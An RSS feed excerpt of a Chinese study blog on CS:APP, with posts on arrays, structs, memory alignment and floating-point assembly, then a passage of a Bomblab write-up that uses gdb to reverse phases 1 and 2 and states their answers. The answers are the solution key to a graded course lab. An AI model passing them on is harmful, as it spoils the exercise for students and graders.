&lt;p&gt;C语言中,结构体会为每个字段分配单独的存储空间;而联合体使用占空间最大的字段的大小来分配内存,智能存储一个字段的值.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;union U1 { 
	char c; 
	int i[2]; 
	double v; 
} *up;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250124174011.png&quot; alt=&quot;&quot;&gt;
对一个存有数据的联合体读取不同字段的结构取决于小端序和大端序.&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Tue, 21 Jan 2025 16:00:00 GMT</pubDate></item><item><title>机器级编程IV(数据)</title><link>https://tankimzeg.top/blog/csapp/machine-level-programming-iv/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/machine-level-programming-iv/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/machine-level-programming-iv/&quot;&gt;https://tankimzeg.top/blog/csapp/machine-level-programming-iv/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;之前讨论的数据类型都是整型,这部分是将多个数据元素聚合在一起.&lt;/p&gt;
&lt;h1&gt;数组&lt;/h1&gt;
&lt;h2&gt;数组分配空间&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;	ElemType A[L];
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在内存中连续分配 L * sizeof(ElemType) 字节的空间.&lt;/p&gt;
&lt;h2&gt;读取数组&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#define ZLEN 5
typedef int zip_dig[ZLEN];

int get_digit(zip_dig z, int digit){
	return z[digit];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对应的汇编代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	# %rdi = z
	# %rsi = digit
	movl    (%rdi,%rsi,4), %eax      # z[digit] = *(%rdi + %rsi*4)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;修改数组&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void zincr(zip_dig z){
	size_t i;
	for(i = 0;i &amp;lt; ZLEN;i++)
		z[i]++;
} // 对数组的每个元素加1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对应的汇编代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;    # %rdi = z
    movl    $0, %eax               # i = 0
    jmp     .L3
.L4:
	addl    $1, (%rdi, %rax, 4)    # z[i]++
	addq    $1, %rax               # i++
.L3:
	cmp    $4, %rax                # 循环条件判断
	jbe    .L4
	rep; ret
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;多维数组&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;	ElemType A[R][C];
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在数据结构中我已经学过矩阵的相关操作,跟这里是贯通的.数组大小占 &lt;code&gt;R*C*sizeof(ElemType)&lt;/code&gt; 字节,在内存中按行主序储存. &lt;code&gt;A[i][j]&lt;/code&gt;的地址是 &lt;code&gt;A+(i*C+j)*sizeof(ElemType)&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int get_pgh_digit (int index, int dig) { 
	return pgh[index][dig]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对应的汇编代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;get_phg_digit:
	leaq (%rdi,%rdi,4), %rax   # 5*index 
	addl %rax, %rsi            # 5*index+dig
	movl phg(,%%rsi,4), %eax   # M[pgh + 4*(5*index+dig)]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另一种声明方式是&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#define UCOUNT 3
zip_dig CMU = {1,5,2,1,3};
zip_dig MIT = {0,2,1,3,9};
zip_dig UCB = {9,4,7,2,0};

zip_digt univ[UCOUNT] = {MIT, CMU, UCB};
int get_univ_digit (size_t index, size_t digit) { 
	return univ[index][digit]; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也可以这样读取&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;get_univ_digit:
	salq    $2, %rsi                    # digit*4
	addq    univ(,%rdi,8), %rsi         # p = univ[index] + digit*4  一个指针的大小是8字节
	movl    (%rsi), %eax                # return *p
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;与第一种相比,这种多维数组的定义方式,存放的元素是指针,元素不一定连续.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250122114001.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;结构体&lt;/h1&gt;
&lt;h2&gt;结构体分配空间&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct rec{
	int a[4];
	size_t i;
	struct rec *next;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250122115115.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;结构体在内存中以块呈现,容纳所有字段.&lt;/li&gt;
&lt;li&gt;字段按照声明的顺序排列.&lt;/li&gt;
&lt;li&gt;编译器将追踪每个字段的起始位置,然后生成适当的字节偏移(相对结构体地址)来得到不同字段.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;产生结构体成员的指针&lt;/h2&gt;
&lt;p&gt;编译器能记住每个字段起始的位置,所以,对于上面那个结构体&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;get_ap:
	# r in %rdi, idx in %rsi
	leaq    (%rdi, %rsi, 4), %rax     # &amp;amp;r-&amp;gt;a[idx]
	ret

get_i:
	# r in %rdi
	movslq   16(%rdi), %rax     # i = M[r+16]

get_next:
	# r in %rdi
	movq     24(%rdi), %rax     # next = M[r+24]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;内存对齐&lt;/h2&gt;
&lt;p&gt;为了提升存取性能而使用内存对齐.
编译器实际会在分配空间时在数据结构中插入一些空白的不被使用的字节.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我在用结构体设计IPv4报文头部的时候发现了这种现象.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一个这样的结构体:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct s1{
	char c;
	int i[2];
	double v;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在对齐之前
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250122122544.png&quot; alt=&quot;&quot;&gt;
对齐之后
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250122122616.png&quot; alt=&quot;&quot;&gt;
关于内存对齐的详细介绍,我参考了&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30007037&quot;&gt;C/C++内存对齐详解 - 知乎&lt;/a&gt;
在x86-64机器上,gcc默认 &lt;code&gt;#pragma pack(8)&lt;/code&gt;,所以&amp;quot;对齐系数&amp;quot;是8字节.
&lt;strong&gt;有效对齐值&lt;/strong&gt;:&amp;quot;对齐系数&amp;quot;与结构体中最长数据类型中较小的那个
结构体第一个成员的偏移量是0,以后每个成员的偏移量是该成员大小与有效对齐值中较小的那个的整数倍;结构体总大小为有效对齐值的整数倍.
对图片进行解释:有效对齐值是8字节,c放在第一个位置没有疑议,然后i[0]的地址需要是4的倍数,所以在c和i[0]之间填充3个字节.v的地址需要是8的倍数,所以在i[1]和v之间填充4个字节.
这给了我取消内存对齐的方法:设置 &lt;code&gt;#pragma pack(1)&lt;/code&gt; 或者在定义结构体的最后加上 &lt;code&gt;__attribute__((packed))&lt;/code&gt;会让这个结构体内部不对齐.
通过调整结构体中成员的顺序,可能节省空间.&lt;/p&gt;
&lt;h1&gt;浮点数&lt;/h1&gt;
&lt;p&gt;CPU有16个浮点数寄存器,都是调用者保存.
AVX浮点体系允许数据存储在YMM寄存器中,命名为%ymm0 ~ %ymm15
SSE则使用%xmm0 ~ %xmm15.
每个YMM寄存器保存32字节,低16字节可以作为XMM寄存器使用.
CS:APP书中讲解的是AVX体系,视频讲解的是SSE体系.我亲自实验了两者,它们的指令是不一样的:
Ctrl+F12生成汇编代码
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250122183441.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;double sum(double a,double b){  
    return a+b;  
}  
  
int main(){  
    double d = 7.8;  
    double a = 3.14;  
    return sum(a,d);  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;AVX版本
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250122182833.png&quot; alt=&quot;&quot;&gt;
(剔除了大量注释和.开头的变量)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt; # options passed: -mavx -mtune=core2 -march=nocona -Og -std=c99  
sum:  
    vaddsd    %xmm1, %xmm0, %xmm0     # tmp87, tmp86, tmp85  
    ret         
main:  
    subq    $40, %rsp     #,  
    call    __main     #  
    vmovsd    .LC0(%rip), %xmm1     #,  
    vmovsd    .LC1(%rip), %xmm0     #,  
    call    sum     #  
    vcvttsd2sil    %xmm0, %eax     
    addq    $40, %rsp     #,  
    ret       
.LC0:  
    .long    858993459  
    .long    1075786547  
    .align 8  
.LC1:  
    .long    1374389535  
    .long    1074339512  
    .ident    &amp;quot;GCC: (x86_64-posix-seh, Built by MinGW-Builds project) 11.4.0&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;SSE版本
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250122183302.png&quot; alt=&quot;&quot;&gt;
(提出了大量注释和.开头的变量)&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt; # options passed: -msse -mtune=core2 -march=nocona -Og -std=c99  
sum:  
    addsd    %xmm1, %xmm0     # tmp87, tmp85  
    ret       
main:  
    subq    $40, %rsp     #,  
    call    __main     #  
    movsd    .LC0(%rip), %xmm1     #,  
    movsd    .LC1(%rip), %xmm0     #,  
    call    sum     #  
    cvttsd2sil    %xmm0, %eax     # tmp87, &amp;lt;retval&amp;gt;  
    addq    $40, %rsp     #,  
    ret    
.LC0:  
    .long    858993459  
    .long    1075786547  
    .align 8  
.LC1:  
    .long    1374389535  
    .long    1074339512  
    .ident    &amp;quot;GCC: (x86_64-posix-seh, Built by MinGW-Builds project) 11.4.0&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;CS:APP 3.11中像整数那样详细介绍了浮点代码,暂时略过不深入研究了.&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Mon, 20 Jan 2025 16:00:00 GMT</pubDate></item><item><title>Bomblab</title><link>https://tankimzeg.top/blog/csapp/bomblab/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/bomblab/</guid><description>Bomblab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/bomblab/&quot;&gt;https://tankimzeg.top/blog/csapp/bomblab/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;入手准备&lt;/h1&gt;
&lt;p&gt;首先,确保Linux上安装了gdb:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;sudo apt update
sudo apt-get install gdb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在bomb.c文件中的是main()函数,这里截取主要部分,看到程序逻辑:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;stdio.h&amp;gt;  
#include &amp;lt;stdlib.h&amp;gt;  
#include &amp;quot;support.h&amp;quot;  
#include &amp;quot;phases.h&amp;quot;  
  
/*  * Note to self: Remember to erase this file so my victims will have no  
 * idea what is going on, and so they will all blow up in a  
 * spectaculary fiendish explosion. -- Dr. Evil  */  
  
FILE *infile;  
  
int main(int argc, char *argv[])  
{  
    char *input;


    // 这里略去输入重定向的处理...


/* Do all sorts of secret stuff that makes the bomb harder to defuse. */  
    initialize_bomb();  
  
    printf(&amp;quot;Welcome to my fiendish little bomb. You have 6 phases with\n&amp;quot;);  
    printf(&amp;quot;which to blow yourself up. Have a nice day!\n&amp;quot;);  
  
    /* Hmm...  Six phases must be more secure than one phase! */  
    input = read_line();             /* Get input                   */  
    phase_1(input);                  /* Run the phase               */  
    phase_defused();                 /* Drat!  They figured it out!  
                      * Let me know how they did it. */  
    printf(&amp;quot;Phase 1 defused. How about the next one?\n&amp;quot;);  
  
    /* The second phase is harder.  No one will ever figure out  
     * how to defuse this... */  
    input = read_line();  
    phase_2(input);  
    phase_defused();  
    printf(&amp;quot;That&amp;#39;s number 2.  Keep going!\n&amp;quot;);  
  
    /* I guess this is too easy so far.  Some more complex code will  
     * confuse people. */  
    input = read_line();  
    phase_3(input);  
    phase_defused();  
    printf(&amp;quot;Halfway there!\n&amp;quot;);  
  
    /* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */  
    input = read_line();  
    phase_4(input);  
    phase_defused();  
    printf(&amp;quot;So you got that one.  Try this one.\n&amp;quot;);  
        /* Round and &amp;#39;round in memory we go, where we stop, the bomb blows! */  
    input = read_line();  
    phase_5(input);  
    phase_defused();  
    printf(&amp;quot;Good work!  On to the next...\n&amp;quot;);  
  
    /* This phase will never be used, since no one will get past the  
     * earlier ones.  But just in case, make this one extra hard. */  
    input = read_line();  
    phase_6(input);  
    phase_defused();  
  
    /* Wow, they got it!  But isn&amp;#39;t something... missing?  Perhaps  
     * something they overlooked?  Mua ha ha ha ha! */  
        return 0;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;显然,解谜要点隐藏在&lt;code&gt;phase_1&lt;/code&gt;, &lt;code&gt;phase_2&lt;/code&gt;,..., &lt;code&gt;phase_6&lt;/code&gt;中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gdb bomb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;设置断点,阻止炸弹爆炸:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) b explode_bomb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这是explode_bomb代码,不再深究:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble explode_bomb
Dump of assembler code for function explode_bomb:
   0x000000000040143a &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp
   0x000000000040143e &amp;lt;+4&amp;gt;:     mov    $0x4025a3,%edi
   0x0000000000401443 &amp;lt;+9&amp;gt;:     call   0x400b10 &amp;lt;puts@plt&amp;gt;
   0x0000000000401448 &amp;lt;+14&amp;gt;:    mov    $0x4025ac,%edi
   0x000000000040144d &amp;lt;+19&amp;gt;:    call   0x400b10 &amp;lt;puts@plt&amp;gt;
   0x0000000000401452 &amp;lt;+24&amp;gt;:    mov    $0x8,%edi
   0x0000000000401457 &amp;lt;+29&amp;gt;:    call   0x400c20 &amp;lt;exit@plt&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行程序:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb)r
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;phase_1&lt;/h1&gt;
&lt;p&gt;在gdb中使用反汇编工具&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb)disasemble phase_1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到反汇编结果:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Dump of assembler code for function phase_1:
   0x00400ee0 &amp;lt;+0&amp;gt;:     sub    $0x8,%rsp
   0x00400ee4 &amp;lt;+4&amp;gt;:     mov    $0x402400,%esi
   0x00400ee9 &amp;lt;+9&amp;gt;:     call   0x401338 &amp;lt;strings_not_equal&amp;gt;
   0x00400eee &amp;lt;+14&amp;gt;:    test   %eax,%eax
   0x00400ef0 &amp;lt;+16&amp;gt;:    je     0x400ef7 &amp;lt;phase_1+23&amp;gt;
   0x00400ef2 &amp;lt;+18&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x00400ef7 &amp;lt;+23&amp;gt;:    add    $0x8,%rsp
   0x00400efb &amp;lt;+27&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注意到 &lt;code&gt;test  %eax, %eax&lt;/code&gt;,当%eax=0的时候会执行 &lt;code&gt;je&lt;/code&gt;,跳过explor_bomb函数,解开炸弹
%esi的值是0x00402400(32bits)
看到有一个&lt;strings_not_equal&gt;函数,继续&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble strings_not_equal
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Dump of assembler code for function strings_not_equal:
   0x00401338 &amp;lt;+0&amp;gt;:     push   %r12
   0x0040133a &amp;lt;+2&amp;gt;:     push   %rbp
   0x0040133b &amp;lt;+3&amp;gt;:     push   %rbx
   0x0040133c &amp;lt;+4&amp;gt;:     mov    %rdi,%rbx                         # %rdi是存放input指针,先复制到%rbx
   0x0040133f &amp;lt;+7&amp;gt;:     mov    %rsi,%rbp                         # %rbp复制为0x402400
   0x00401342 &amp;lt;+10&amp;gt;:    call   0x40131b &amp;lt;string_length&amp;gt;
   0x00401347 &amp;lt;+15&amp;gt;:    mov    %eax,%r12d                        # input字符串的长度存放到%r12d
   0x0040134a &amp;lt;+18&amp;gt;:    mov    %rbp,%rdi                         # 把%rbp赋值给函数参数%rdi
   0x0040134d &amp;lt;+21&amp;gt;:    call   0x40131b &amp;lt;string_length&amp;gt;          # 返回%rdi的长度
   0x00401352 &amp;lt;+26&amp;gt;:    mov    $0x1,%edx                         # %edx赋值为1
   0x00401357 &amp;lt;+31&amp;gt;:    cmp    %eax,%r12d                        # 0x402400字符串的长度与input字符串长度相比较
   0x0040135a &amp;lt;+34&amp;gt;:    jne    0x40139b &amp;lt;strings_not_equal+99&amp;gt;   # 必须相等,否则函数将返回1
   0x0040135c &amp;lt;+36&amp;gt;:    movzbl (%rbx),%eax
   0x0040135f &amp;lt;+39&amp;gt;:    test   %al,%al
   0x00401361 &amp;lt;+41&amp;gt;:    je     0x401388 &amp;lt;strings_not_equal+80&amp;gt;
   0x00401363 &amp;lt;+43&amp;gt;:    cmp    0x0(%rbp),%al
   0x00401366 &amp;lt;+46&amp;gt;:    je     0x401372 &amp;lt;strings_not_equal+58&amp;gt;
   0x00401368 &amp;lt;+48&amp;gt;:    jmp    0x40138f &amp;lt;strings_not_equal+87&amp;gt;
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x0040136a &amp;lt;+50&amp;gt;:    cmp    0x0(%rbp),%al
   0x0040136d &amp;lt;+53&amp;gt;:    nopl   (%rax)
   0x00401370 &amp;lt;+56&amp;gt;:    jne    0x401396 &amp;lt;strings_not_equal+94&amp;gt;
   0x00401372 &amp;lt;+58&amp;gt;:    add    $0x1,%rbx
   0x00401376 &amp;lt;+62&amp;gt;:    add    $0x1,%rbp
   0x0040137a &amp;lt;+66&amp;gt;:    movzbl (%rbx),%eax
   0x0040137d &amp;lt;+69&amp;gt;:    test   %al,%al
   0x0040137f &amp;lt;+71&amp;gt;:    jne    0x40136a &amp;lt;strings_not_equal+50&amp;gt;
   0x00401381 &amp;lt;+73&amp;gt;:    mov    $0x0,%edx
   0x00401386 &amp;lt;+78&amp;gt;:    jmp    0x40139b &amp;lt;strings_not_equal+99&amp;gt;
   0x00401388 &amp;lt;+80&amp;gt;:    mov    $0x0,%edx
   0x0040138d &amp;lt;+85&amp;gt;:    jmp    0x40139b &amp;lt;strings_not_equal+99&amp;gt;
   0x0040138f &amp;lt;+87&amp;gt;:    mov    $0x1,%edx
   0x00401394 &amp;lt;+92&amp;gt;:    jmp    0x40139b &amp;lt;strings_not_equal+99&amp;gt;
   0x00401396 &amp;lt;+94&amp;gt;:    mov    $0x1,%edx
   0x0040139b &amp;lt;+99&amp;gt;:    mov    %edx,%eax
   0x0040139d &amp;lt;+101&amp;gt;:   pop    %rbx
   0x0040139e &amp;lt;+102&amp;gt;:   pop    %rbp
   0x0040139f &amp;lt;+103&amp;gt;:   pop    %r12
   0x004013a1 &amp;lt;+105&amp;gt;:   ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看到有一个&lt;string_length&gt;函数,继续&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble string_length
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Dump of assembler code for function string_length:
   0x0040131b &amp;lt;+0&amp;gt;:     cmpb   $0x0,(%rdi)
   0x0040131e &amp;lt;+3&amp;gt;:     je     0x401332 &amp;lt;string_length+23&amp;gt;
   0x00401320 &amp;lt;+5&amp;gt;:     mov    %rdi,%rdx
   0x00401323 &amp;lt;+8&amp;gt;:     add    $0x1,%rdx
   0x00401327 &amp;lt;+12&amp;gt;:    mov    %edx,%eax
   0x00401329 &amp;lt;+14&amp;gt;:    sub    %edi,%eax
   0x0040132b &amp;lt;+16&amp;gt;:    cmpb   $0x0,(%rdx)
   0x0040132e &amp;lt;+19&amp;gt;:    jne    0x401323 &amp;lt;string_length+8&amp;gt;
   0x00401330 &amp;lt;+21&amp;gt;:    repz ret
   0x00401332 &amp;lt;+23&amp;gt;:    mov    $0x0,%eax
   0x00401337 &amp;lt;+28&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这是一个简单的函数,返回%rdi指向的字符串的长度到%eax
一步一步看下来,感觉是逐个比较输入字符串与0x402400字符串,相同就拆除了炸弹.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) x /s 0x402400
0x402400:       &amp;quot;Border relations with Canada have never been better.&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;就可以显示该地址对应的字符串.
拆开第一个炸弹的结果:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) r
Starting program: /mnt/e/Documents/C/CSAPP/bomb/bomb
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Border relations with Canada have never been better.
Phase 1 defused. How about the next one?
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;phase_2&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble phase_2
Dump of assembler code for function phase_2:
   0x00400efc &amp;lt;+0&amp;gt;:     push   %rbp
   0x00400efd &amp;lt;+1&amp;gt;:     push   %rbx
   0x00400efe &amp;lt;+2&amp;gt;:     sub    $0x28,%rsp                      # 栈顶指针减去0x28(40)
   0x00400f02 &amp;lt;+6&amp;gt;:     mov    %rsp,%rsi                       # 此时复制给%rsi
   0x00400f05 &amp;lt;+9&amp;gt;:     call   0x40145c &amp;lt;read_six_numbers&amp;gt;     
   0x00400f0a &amp;lt;+14&amp;gt;:    cmpl   $0x1,(%rsp)                     # %rsp指向的内存的值应该是0x1
   0x00400f0e &amp;lt;+18&amp;gt;:    je     0x400f30 &amp;lt;phase_2+52&amp;gt;           # 去52看看
   0x00400f10 &amp;lt;+20&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x00400f15 &amp;lt;+25&amp;gt;:    jmp    0x400f30 &amp;lt;phase_2+52&amp;gt;
   0x00400f17 &amp;lt;+27&amp;gt;:    mov    -0x4(%rbx),%eax                 # %rbx-4=%rsp,%rsp指向的内存的值赋值给%eax
   0x00400f1a &amp;lt;+30&amp;gt;:    add    %eax,%eax                       # %eax的值乘以2
   0x00400f1c &amp;lt;+32&amp;gt;:    cmp    %eax,(%rbx)                     # 比较%eax和%rbx=%rcx指向的内存的值
   0x00400f1e &amp;lt;+34&amp;gt;:    je     0x400f25 &amp;lt;phase_2+41&amp;gt;           # 必须相等,去41看看
   0x00400f20 &amp;lt;+36&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x00400f25 &amp;lt;+41&amp;gt;:    add    $0x4,%rbx                       # %rbx=%rbx+4=%r8
   0x00400f29 &amp;lt;+45&amp;gt;:    cmp    %rbp,%rbx                       
   0x00400f2c &amp;lt;+48&amp;gt;:    jne    0x400f17 &amp;lt;phase_2+27&amp;gt;
   0x00400f2e &amp;lt;+50&amp;gt;:    jmp    0x400f3c &amp;lt;phase_2+64&amp;gt;
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x00400f30 &amp;lt;+52&amp;gt;:    lea    0x4(%rsp),%rbx                # 此时%rcx=%rbx
   0x00400f35 &amp;lt;+57&amp;gt;:    lea    0x18(%rsp),%rbp               # 底部加上24的地址记为%rbp
   0x00400f3a &amp;lt;+62&amp;gt;:    jmp    0x400f17 &amp;lt;phase_2+27&amp;gt;         # 去27看看
   0x00400f3c &amp;lt;+64&amp;gt;:    add    $0x28,%rsp
   0x00400f40 &amp;lt;+68&amp;gt;:    pop    %rbx
   0x00400f41 &amp;lt;+69&amp;gt;:    pop    %rbp
   0x00400f42 &amp;lt;+70&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble read_six_numbers
Dump of assembler code for function read_six_numbers:
   0x000000000040145c &amp;lt;+0&amp;gt;:     sub    $0x18,%rsp                # 栈顶指针再减去0x18(24)
   0x0000000000401460 &amp;lt;+4&amp;gt;:     mov    %rsi,%rdx                 # 底部是%rsp,顶部是%rsi,复制给%rdx
   0x0000000000401463 &amp;lt;+7&amp;gt;:     lea    0x4(%rsi),%rcx            # 顶部加上4的地址记为%rcx
   0x0000000000401467 &amp;lt;+11&amp;gt;:    lea    0x14(%rsi),%rax           # 顶部加上20的地址记为%rax
   0x000000000040146b &amp;lt;+15&amp;gt;:    mov    %rax,0x8(%rsp)            # %rsp+8那块内存保存了%rax
   0x0000000000401470 &amp;lt;+20&amp;gt;:    lea    0x10(%rsi),%rax           # 顶部加上16的地址记为%rax
   0x0000000000401474 &amp;lt;+24&amp;gt;:    mov    %rax,(%rsp)               # 底部那块内存保存了%rax
   0x0000000000401478 &amp;lt;+28&amp;gt;:    lea    0xc(%rsi),%r9             # 顶部加上12的地址记为%r9
   0x000000000040147c &amp;lt;+32&amp;gt;:    lea    0x8(%rsi),%r8             # 顶部加上8的地址记为%r8
   0x0000000000401480 &amp;lt;+36&amp;gt;:    mov    $0x4025c3,%esi            # %esi赋值为0x4025c3,我们可以打印这个内存地址的内容
   0x0000000000401485 &amp;lt;+41&amp;gt;:    mov    $0x0,%eax                 # %eax赋值为0
   0x000000000040148a &amp;lt;+46&amp;gt;:    call   0x400bf0 &amp;lt;__isoc99_sscanf@plt&amp;gt;  # 我说怎么没用到%rdi呢,原来在这里处理输入
   0x000000000040148f &amp;lt;+51&amp;gt;:    cmp    $0x5,%eax                 # sscanf函数的返回值与5相比较
   0x0000000000401492 &amp;lt;+54&amp;gt;:    jg     0x401499 &amp;lt;read_six_numbers+61&amp;gt;
   0x0000000000401494 &amp;lt;+56&amp;gt;:    call   0x40143a &amp;lt;explode_bomb&amp;gt;
   0x0000000000401499 &amp;lt;+61&amp;gt;:    add    $0x18,%rsp                # 如果大于5,栈底回到栈顶
   0x000000000040149d &amp;lt;+65&amp;gt;:    ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) x /s 0x4025c3
0x4025c3:       &amp;quot;%d %d %d %d %d %d&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;到这里就清晰了,答案应该是6个整数,以空格隔开: &lt;code&gt;1 2 4 8 16 32&lt;/code&gt;
为了避免每次拆炸弹时都要输入一遍之前的答案,bomb.c中告诉我可以带参数运行,能打开文件读取内容.我把这个文件命名为answer&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) r answer
Starting program: /mnt/e/Documents/C/CSAPP/bomb/bomb answer
[Thread debugging using libthread_db enabled]
Using host libthread_db library &amp;quot;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;quot;.
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That&amp;#39;s number 2.  Keep going!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功了!&lt;/p&gt;
&lt;h1&gt;phase_3&lt;/h1&gt;
